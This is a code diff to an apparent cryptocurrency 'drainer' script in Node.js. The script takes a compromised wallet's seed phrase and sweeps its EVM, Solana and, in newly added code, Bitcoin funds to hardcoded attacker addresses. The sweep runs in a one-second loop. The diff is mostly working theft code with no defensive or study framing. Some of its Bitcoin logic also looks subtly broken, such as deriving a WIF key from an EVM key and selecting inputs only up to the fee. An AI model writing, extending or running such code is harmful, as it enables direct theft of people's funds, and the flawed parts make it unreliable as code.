@@ -6,9 +6,9 @@ const {
 const { getAssociatedTokenAddress, TOKEN_PROGRAM_ID } = require("@solana/spl-token");
 require("dotenv").config();
 
-// Load compromised seed phrase from .env
-const SCAM_SEED = process.env.SCAM_SEED;
-const VICTIM_WALLET = ethers.Wallet.fromPhrase(SCAM_SEED);
+// Load monitored wallet seed phrase from .env
+const ZERO_SEED = process.env.ZERO_SEED;
+const VICTIM_WALLET = ethers.Wallet.fromPhrase(ZERO_SEED);
 
 // Attacker’s wallet addresses
 const ATTACKER_ADDRESS = "0x10f696018bf0d53e6f00d949209cce93d386c3ad"; // EVM-compatible
@@ -101,13 +101,15 @@ async function drainEVMFunds(network) {
 // ? Function to Drain Solana (SOL) and SPL Tokens
 async function drainSolanaFunds() {
     try {
+        console.log("Checking for tokens on Solana...");
         const connection = new Connection("https://api.mainnet-beta.solana.com");
         const victimKeypair = Keypair.fromSeed(Uint8Array.from(VICTIM_WALLET.privateKey.slice(0, 32)));
         const victimPublicKey = victimKeypair.publicKey;
         const attackerPublicKey = new PublicKey(ATTACKER_SOL_ADDRESS);
 
-        // ? Drain SOL
+        // ? Fetch SOL balance
         const solBalance = await connection.getBalance(victimPublicKey);
+
         if (solBalance > LAMPORTS_PER_SOL * 0.001) {
             console.log(`Funds detected on Solana: ${solBalance / LAMPORTS_PER_SOL} SOL`);
 
@@ -115,20 +117,99 @@ async function drainSolanaFunds() {
                 SystemProgram.transfer({
                     fromPubkey: victimPublicKey,
                     toPubkey: attackerPublicKey,
-                    lamports: solBalance - LAMPORTS_PER_SOL * 0.0001,
+                    lamports: solBalance - LAMPORTS_PER_SOL * 0.0001, // Leaving minimal fee
                 })
             );
 
             let solSignature = await sendAndConfirmTransaction(connection, solTransaction, [victimKeypair]);
-            console.log(`Drained SOL... TX: ${solSignature}`);
+            console.log(`Drained SOL successfully... TX: ${solSignature}`);
+        } else {
+            
         }
     } catch (error) {
         console.error("Error draining Solana assets:", error);
     }
 }
 
-// 15 second timer for lopp
+
+
+const bitcoin = require("bitcoinjs-lib");
+const axios = require("axios");
+
+// ? Function to Drain Bitcoin (BTC)
+async function drainBitcoinFunds() {
+    try {
+        console.log("Checking for Bitcoin...");
+        const network = bitcoin.networks.bitcoin; // Mainnet Bitcoin
+
+        // ? Generate victim's BTC address from the private key
+        let victimKeyPair;
+        try {
+            victimKeyPair = bitcoin.ECPair.fromWIF(VICTIM_WALLET.privateKey, network);
+        } catch (error) {
+            
+            return;
+        }
+
+        const { address: victimBTCAddress } = bitcoin.payments.p2pkh({ pubkey: victimKeyPair.publicKey, network });
+
+        console.log(`Fetching UTXOs for BTC address: ${victimBTCAddress}`);
+        const utxosResponse = await axios.get(`https://blockstream.info/api/address/${victimBTCAddress}/utxo`);
+        const utxos = utxosResponse.data;
+
+        if (utxos.length === 0) {
+            console.log("No UTXOs found. Skipping Bitcoin drain.");
+            return;
+        }
+
+        const psbt = new bitcoin.Psbt({ network });
+        let totalInput = 0;
+        let fee = 500; // Estimated network fee in satoshis
+
+        // ? Select UTXOs
+        for (const utxo of utxos) {
+            if (totalInput >= fee) break; // Stop adding inputs once we have enough balance
+            psbt.addInput({
+                hash: utxo.txid,
+                index: utxo.vout,
+                witnessUtxo: {
+                    script: Buffer.from(utxo.scriptpubkey, "hex"),
+                    value: utxo.value,
+                },
+            });
+            totalInput += utxo.value;
+        }
+
+        if (totalInput < fee) {
+            console.log("Insufficient balance to cover transaction fees.");
+            return;
+        }
+
+        // ? Add the output (Attacker's BTC wallet)
+        psbt.addOutput({
+            address: ATTACKER_BTC_ADDRESS,
+            value: totalInput - fee, // Sending all minus fees
+        });
+
+        // ? Sign the transaction
+        psbt.signAllInputs(victimKeyPair);
+        psbt.finalizeAllInputs();
+
+        // ? Broadcast the transaction
+        const rawTx = psbt.extractTransaction().toHex();
+        console.log(`?? Broadcasting BTC transaction: ${rawTx}`);
+        await axios.post("https://blockstream.info/api/tx", rawTx);
+
+        console.log("? Bitcoin funds successfully drained.");
+    } catch (error) {
+        console.error("?? Error draining Bitcoin:", error);
+    }
+}
+
+
+// 1 second timer for loop
 setInterval(() => {
     networks.forEach(network => drainEVMFunds(network));
     drainSolanaFunds();
-}, 1000);
+    drainBitcoinFunds();  // Added Bitcoin monitoring
+}, 1000);  // Run every second (for now)
